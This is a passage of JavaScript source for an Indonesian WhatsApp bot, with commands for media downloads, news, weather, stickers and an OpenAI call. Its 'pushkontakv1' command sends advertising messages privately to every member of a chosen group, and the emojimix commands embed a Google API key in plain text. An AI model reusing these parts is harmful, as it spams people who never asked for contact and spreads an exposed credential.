			if (args.length == 0) return newReply(`Example: ${prefix + command} https://vt.tiktok.com/ZSLY6vHYP`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result.link }, mimetype: 'video/mp4' })
			})
			.catch(console.error)
			break
			
			case 'tiktokaudio':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://vt.tiktok.com/ZSLY6vHYP`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${apikey}&url=${full_args}`).then(({ data }) => {
				conn.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: 'audio/mp3' })
			})
			.catch(console.error)
			break

		    case 'fbdl':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result }, mimetype: 'video/mp4' })
			})
			.catch(console.error)
			break
			
			// Tools Fitur
			case 'style':
            case 'styletext': {
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    styletext
                } = require('./lib/scraper')
                if (!text) return newReply('Masukkan Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `🖋️ *${i.name}* : ${i.result}\n\n`
                }
                newReply(teks)
            }
            break
            
            case 'hapus': 
            case 'delete': 
            case 'del': 
            case 'd': {
                if (!m.quoted) return false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return newReply('Pesan tersebut bukan dikirim oleh bot!')
                conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break

            case 'q':
            case 'quoted': {
                if (!m.quoted) return newReply('Reply Pesannya!!')
                let wokwol = await conn.serializeM(await m.getQuotedObj())
                if (!wokwol.quoted) return newReply('Pesan Yang Anda Reply Tidak Mengandung Reply')
                await wokwol.quoted.copyNForward(m.chat, true)
            }
            break
            
            case 'ebinary': {
                let {
                    eBinary
                } = require('./lib/binary')
                let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
                let eb = await eBinary(teks)
                newReply(eb)
            }
            break
            case 'dbinary': {
                let {
                    dBinary
                } = require('./lib/binary')
                let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
                let db = await dBinary(teks)
                newReply(db)
            }
            break
            
            // Information Fitur

            case 'pinterest':
                if (!text) return newReply(`Example : ${prefix + command}`)
                newReply(mess.wait)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5 // -1 limit
		        let { pinterest } = require('./lib/scraper')
                let anui = await pinterest(text)
                result = anui[Math.floor(Math.random() * anui.length)]               
                conn.sendMessage(m.chat, { image: { url: result }, caption: mess.done}, { quoted: m })
            	.catch(console.error)
            break
            
            case 'google': {
                if (!text) return newReply(`Contoh : ${prefix + command} fatih arridho`)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5 // -1 limit
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `• *Title* : ${g.title}\n`
                teks += `• *Description* : ${g.snippet}\n`
                teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                newReply(teks)
                })
                }
            break
            
            case 'infochat': {
                if (!m.quoted) newReply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) return newReply('Pesan tersebut bukan dikirim oleh bot!')
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `👤 @${i.userJid.split('@')[0]}\n`
                    teks += `⏳ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')}\n📈 *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                newReply(teks)
            }
            break
            
            case 'kbbi':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} kursi`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kbbi?apikey=${apikey}&query=${full_args}`)
			var titid = `\`\`\`Kata : ${data.result[0].nama}\`\`\`\n`
			titid += `\`\`\`Kata Dasar : ${data.result[0].kata_dasar}\`\`\`\n`
			titid += `\`\`\`Pelafalan : ${data.result[0].pelafalan}\`\`\`\n`
			titid += `\`\`\`Bentuk Tidak Baku : ${data.result[0].bentuk_tidak_baku}\`\`\`\n\n`
			for (var x of data.result) {
				titid += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
				titid += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
				titid += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
				titid += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
				titid += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
			}
			newReply(titid)
			}
			break
		case 'brainly':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} siapakah sukarno`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/brainly?apikey=${apikey}&query=${full_args}`)
			var ti  = 'Beberapa Pembahasan Dari Brainly :\n\n'
			for (var x of data.result) {
				ti  += `==============================\n`
				ti  += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
				ti  += `\`\`\`Jawaban :\`\`\`\n${x.answer[0].content}\n`
				ti  += `==============================\n\n`
			}
			newReply(ti )
			}
			break
			
			case 'katabijak':{
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/katabijak?apikey=${apikey}`)
			var bijak = `${data.result}`
			newReply(bijak)
			}
			break
			
			case 'puisi':{
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/puisi?apikey=${apikey}`)
			var puisi = `${data.result}`
			newReply(puisi)
			}
			break
			
			case 'bucin':{
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/bucin?apikey=${apikey}`)
			var pui = `${data.result}`
			newReply(pui)
			}
			break
			
			case 'bucin2':{
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/katabucin?apikey=${apikey}`)
			var puii = `${data.result}`
			newReply(puii)
			}
			break
			
			case 'quotesislami':{
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/quotes/islami?apikey=${apikey}`)
			var puiii = `${data.result}`
			newReply(puiii)
			}
			break
			
			case 'quotesdilan':{
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${apikey}`)
			var dilan = `${data.result}`
			newReply(dilan)
			}
			break
			
			case 'namarandom':{
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/nama?apikey=${apikey}`)
			var nma = `${data.result}`
			newReply(nma)
			}
			break
			
		    case 'roboguru':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} siapakah sukarno`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=${apikey}&query=${full_args}&grade=sma&subject=sejarah`).catch((err) => console.error(err?.response?.data))
			var tit = 'Beberapa Pembahasan Dari Roboguru :\n\n'
			for (var x of data.result) {
				tit += `==============================\n`
				tit += `\`\`\`Pertanyaan :\`\`\`\n${x.question}\n\n`
				tit += `\`\`\`Jawaban :\`\`\`\n${x.answer}\n`
				tit += `==============================\n\n`
			}
			newReply(tit)
			}
			break
			
		    case 'jarak':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} jakarta - yogyakarta`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			var titt1 = full_args.split('-')[0].trim()
			var titt2 = full_args.split('-')[1].trim()
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${apikey}&kota1=${titt1}&kota2=${titt2}`)
			var titt = `Informasi Jarak dari ${titt1} ke ${titt2} :\n\n`
			titt += `\`\`\`◪ Asal :\`\`\` ${data.result.from.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.from.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.from.longitude}\n\n`
			titt += `\`\`\`◪ Tujuan :\`\`\` ${data.result.to.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.to.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.to.longitude}\n\n`
			titt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${data.result.jarak}\n`
			titt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
			titt += `   ╭───────────────❏\n`
			titt += `❍┤ Kereta Api : ${data.result.kereta_api}\n`
			titt += `❍┤ Pesawat : ${data.result.pesawat}\n`
			titt += `❍┤ Mobil : ${data.result.mobil}\n`
			titt += `❍┤ Motor : ${data.result.motor}\n`
			titt += `❍┤ Jalan Kaki : ${data.result.jalan_kaki}\n`
			titt += `   ╰───────────────❏\n`
			newReply(titt)
			}
			break
			
			case 'wikipedia':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Tahu`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/wiki?apikey=${apikey}&query=${full_args}`)
			newReply(data.result)
			break
			
		    case 'translate':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} en Tahu Bacem`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var kode_negara = args[0]
			args.shift()
			var tittt = args.join(' ')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${apikey}&text=${tittt}`)
			init_txt = `From : ${data.result.from}\n`
			init_txt += `To : ${data.result.to}\n`
			init_txt += `Original : ${data.result.original}\n`
			init_txt += `Translated : ${data.result.translated}\n`
			init_txt += `Pronunciation : ${data.result.pronunciation}\n`
			newReply(init_txt)
			}
			break
			
		    case 'jadwaltv':
			if (args.length == 0) return newReply(`Example: ${prefix + command} RCTI`)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=${apikey}`)
			newReply(mess.wait)
			var titttt = `Jadwal TV ${args[0].toUpperCase()}\n`
			for (var x in data.result) {
				titttt += `${x} - ${data.result[x]}\n`
			}
			newReply(titttt)
			break
			
		    case 'jadwaltvnow':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
			newReply(mess.wait)
			var tittttt = `Jadwal TV Now :\n`
			for (var x in data.result) {
				tittttt += `${x.toUpperCase()}${data.result[x]}\n\n`
			}
			newReply(tittttt)
			break
			
		    case 'newsinfo':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/newsinfo?apikey=${apikey}`)
			newReply(mess.wait)
			var titttttt = 'Result :\n'
			for (var x of data.result) {
				titttttt += `Title : ${x.title}\n`
				titttttt += `Author : ${x.author}\n`
				titttttt += `Source : ${x.source.name}\n`
				titttttt += `Url : ${x.url}\n`
				titttttt += `Published : ${x.publishedAt}\n`
				titttttt += `Description : ${x.description}\n\n`
			}
			newReply(titttttt)
			}
			break
			
		    case 'cnnindonesia':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=${apikey}`)
			newReply(mess.wait)
			var tittttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttt += `Judul : ${x.judul}\n`
				tittttttt += `Link : ${x.link}\n`
				tittttttt += `Tipe : ${x.tipe}\n`
				tittttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(tittttttt)
			}
			break
			
		    case 'cnnnasional':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${apikey}`)
			newReply(mess.wait)
			var titttttttt = 'Result :\n'
			for (var x of data.result) {
				titttttttt += `Judul : ${x.judul}\n`
				titttttttt += `Link : ${x.link}\n`
				titttttttt += `Tipe : ${x.tipe}\n`
				titttttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(titttttttt)
			}
			break
			
		    case 'cnninternasional':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${apikey}`)
			newReply(mess.wait)
			var tittttttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttttt += `Judul : ${x.judul}\n`
				tittttttttt += `Link : ${x.link}\n`
				tittttttttt += `Tipe : ${x.tipe}\n`
				tittttttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(tittttttttt)
			}
			break
			
		    case 'infogempa':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
			newReply(mess.wait)
			var caption = `Lokasi : ${data.result.lokasi}\n`
			caption += `Waktu : ${data.result.waktu}\n`
			caption += `Potensi : ${data.result.potensi}\n`
			caption += `Magnitude : ${data.result.magnitude}\n`
			caption += `Kedalaman : ${data.result.kedalaman}\n`
			caption += `Koordinat : ${data.result.koordinat}`
			conn.sendMessage(m.chat, { image: { url: data.result.map }, caption })
			break
			
		    case 'lirik':
		    if (!isCreator) return newReply(mess.error)
			if (args.length == 0) return newReply(`Example: ${prefix + command} Melukis Senja`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=${apikey}&query=${full_args}`)
			newReply(data.result)
			.catch(console.error)
			break
			
		    case 'infocuaca':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} Yogyakarta`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
			var titttttttttt = `Tempat : ${data.result.tempat}\n`
			titttttttttt += `Cuaca : ${data.result.cuaca}\n`
			titttttttttt += `Angin : ${data.result.angin}\n`
			titttttttttt += `Description : ${data.result.description}\n`
			titttttttttt += `Kelembapan : ${data.result.kelembapan}\n`
			titttttttttt += `Suhu : ${data.result.suhu}\n`
			titttttttttt += `Udara : ${data.result.udara}\n`
			titttttttttt += `Permukaan laut : ${data.result.permukaan_laut}\n`
			conn.sendMessage(m.chat, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
			newReply(titttttttttt)
			}
			break
			
			case 'kodepos':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
			if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kodepos?apikey=${apikey}&query=${full_args}`)
			var tittttttttttt = `Provinsi : ${data.result[0].province}\n`
			tittttttttttt += `Kabupaten : ${data.result[0].city}\n`
			tittttttttttt += `Kecamatan : ${data.result[0].subdistrict}\n`
			tittttttttttt += `Kelurahan : ${data.result[0].urban}\n`
			tittttttttttt += `Kode Pos : ${data.result[0].postalcode}`
			newReply(tittttttttttt)
			break
			
		    case 'jadwalbola':
		    if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${apikey}`)
			newReply(mess.wait)
			var titttttttttttt = 'Jadwal Bola :\n'
			for (var x of data.result) {
				titttttttttttt += `Pada : ${x.time}\n`
				titttttttttttt += `Event : ${x.event}\n`
				titttttttttttt += `Match : ${x.match}\n`
				titttttttttttt += `TV : ${x.tv}\n\n`
			}
			newReply(titttttttttttt)
			break
			
			// GAME
                case 'tebak': {
                if (args[0].toLowerCase() === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    conn.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply(`Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                }
                }
                break

			// ANIME FITUR
			case 'genshin':
			if (args.length == 0) return newReply(`Example: ${prefix + command} jean`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/genshin/${full_args}?apikey=${apikey}`)
			var caption = `Name : ${data.result.title}\n`
			caption += `Intro : ${data.result.intro}\n`
			caption += `Icon : ${data.result.icon}\n`
			await conn.sendMessage(m.chat, { image: { url: data.result.cover1 }, caption })
			await conn.sendMessage(m.chat, { audio: { url: data.result.cv[0].audio[0] }, mimetype: 'audio/mp4' })
			break
			
			
			// AI MENU

			case 'openai': case 'ai': {
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1
if (!text) return newReply(`👋🏻 Halo Kak, Butuh Bantuan?\nExample:  ${prefix + command} HuTao Cantik Banget Kan?`)
const ChatGPTRequest = async (text) => {

const result = {
success: false,
data: "Aku gak tau",
message: "",
}

return await axios({
method: 'post',
url: 'https://api.openai.com/v1/completions',
data: {
model: "text-davinci-003",
prompt: text,
max_tokens: 1000,
temperature: 0
},
headers: {
"accept": "application/json",
"Content-Type": "application/json",
"Accept-Language": "in-ID",
"Authorization": `Bearer ${keyai}`,
},
})
.then((response) => {
if (response.status == 200) {

const { choices } = response.data;

if (choices && choices.length) {
result.success = true;
result.data = choices[0].text;
}

} else {
result.message = "Failed response";
}

return result;
})
.catch((error) => {
result.message = "Error : " + error.message;
return result;
});
}

const response = await ChatGPTRequest(text)

if (!response.success) {
return newReply(response.message);
}

return newReply(response.data);
}
break

			case 'remini':
			case 'hd': {
			if (!isPremium) return newReply(mess.prem)
			if (!quoted) return newReply(`Fotonya Mana?`)
			if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			newReply(mess.wait)
			let media = await quoted.download()
			let proses = await remini(media, "enhance");
			conn.sendMessage(m.chat, { image: proses, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
			await sleep(5000)
			}
			break

			case 'toanime': case 'jadianime':
if (!isPremium) return newReply(mess.prem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media2 = await conn.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media2)
conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/imagetoanime?apikey=${apikey}&img=${anu}` }, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
	.catch(console.error)
break

case 'pencil':
if (!isPremium) return newReply(mess.prem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media3 = await conn.downloadAndSaveMediaMessage(quoted)
const anub = await TelegraPH(media3)
conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/editor/pencil?apikey=${apikey}&img=${anub}` }, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
	.catch(console.error)
break

case 'removebg':
if (!isPremium) return newReply(mess.prem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media4 = await conn.downloadAndSaveMediaMessage(quoted)
const anuv = await TelegraPH(media4)
conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/removebg?apikey=${apikey}&img=${anuv}` }, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
	.catch(console.error)
break
			// CONVERT FITUR
			
			case 'qc': {
            const { quote } = require('./lib/quote.js')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            newReply(mess.wait)
            conn.sendImageAsSticker(m.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
            }
            break
            
            case 'qcimg':
            const { quote } = require('./lib/quote.js')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            newReply(mess.wait)
            conn.sendMessage(m.chat, { image: { url: rest.result }, caption: `Done?`}, {quoted: m})
            .catch(console.error)
            break
            
			case 'sticker':
            case 'stiker':
            case 's':{
                if (!quoted) return `Balas Video/Image Dengan Caption ${prefix + command}`
                newReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await quoted.download()
                    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                        packname: global.packname,
                        author: global.author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            
            case 'smeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) return newReply(respond)
            if (!text) return newReply(respond)
	        newReply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await conn.downloadAndSaveMediaMessage(qmsg)
	        let fatGans = await TelegraPh(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
	        let FaTiH = await conn.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	        break
	             
            case 'swm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) return newReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (!teks2) return newReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
            	newReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                if (!emoji2) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                newReply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case 'emojimix2': {
                if (!text) return newReply(`Contoh : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case 'attp':
                try {
                if (args.length == 0) return newReply(`Example: ${prefix + command} Nobita-MD`)
                await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp?apikey=${apikey}&text=${full_args}` }}, { quoted: m })
            } catch (e) {
                newReply(mess.error)
            }
            break
            case 'attp2':
                try {
                    if (args.length == 0) return newReply(`Example: ${prefix + command} Nobita-Md`)
                    await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp2?apikey=${apikey}&text=${full_args}` }}, { quoted: m })
                } catch (e) {
                    newReply(mess.error)
            }
            break
            case 'ttp':
                try {
                    if (args.length == 0) return newReply(`Example: ${prefix + command} Nobita-Md`)
                    await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/ttp?apikey=${apikey}&text=${full_args}` }}, { quoted: m })
                } catch (e) {
                    newReply(mess.error)
            }
            break

            case 'listidgc': {
if (!isCreator) return newReply(mess.owner)
newReply(`–––––『 ⎔ 𝙇𝙤𝙖𝙙𝙞𝙣𝙜... 』–––––`)
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP ANDA*\n\nTotal Group : ${anu.length} GROUP\n\n`
for (let x of anu) {
let metadata2 = await conn.groupMetadata(x)
teks += `❏ *INFO GROUP*\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
newReply(teks + `Untuk Penggunaan Silahkan Ketik\nCommand ${prefix}pushkontak id|teks\n\nPOWER BY *© NobitaOfc⚡*`)
}
break
case 'pushkontakv1' : {
          if (!isCreator) return newReply(mess.owner)
          let idgc = text.split("|")[0]
          let pesan = text.split("|")[1]
          if (!idgc && !pesan) return newReply(`Example: ${prefix + command} idgc|pesan`)
          let metaDATA = await conn.groupMetadata(idgc).catch((e) => {m.reply(e)})
          let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
          let count = getDATA.length;
          let sentCount = 0;
          newReply('*_Sedang Push ID..._*')
          for (let i = 0; i < getDATA.length; i++) {
            setTimeout(function() {
              conn.sendMessage(getDATA[i], {
    text: pesan,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
              count--;
              sentCount++;
              if (count === 0) {
                newReply(`*_Semua pesan telah dikirim!_*:\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
              }
            }, i * 5000); // delay of 6 second
          }
        }
        break;
        case "cekmember": {
if (!isCreator) return newReply(mess.owner)
if (!q) return newReply("Id Nya Mana Kak?")
let cekmd = await conn.groupMetadata(q)
let txrk = await conn.sendMessage(from, { text: `Nama Group : ${cekmd.subject}\nMember : ${cekmd.participants.length} Orang` }, { quoted: msg })
